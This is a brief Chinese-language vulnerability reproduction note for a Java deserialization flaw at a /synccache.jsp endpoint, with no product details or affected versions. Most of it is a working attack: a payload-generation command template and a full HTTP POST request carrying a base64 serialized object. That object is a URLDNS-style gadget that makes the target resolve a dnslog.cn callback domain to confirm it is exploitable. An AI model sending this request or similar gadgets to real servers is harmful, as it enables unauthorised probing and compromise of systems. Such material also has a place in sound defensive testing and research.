## 漏洞概述

暂无详情

## 影响范围

```http
未知
```

## 漏洞复现

生成反序列化 payload

```bash
java -jar xx | base64
```

```http
POST /synccache.jsp HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVz
aG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFz
aENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgAD
TAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEHg4Yzgy
dy5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHQAF2h0dHA6Ly94OGM4MncuZG5zbG9nLmNueA==
```

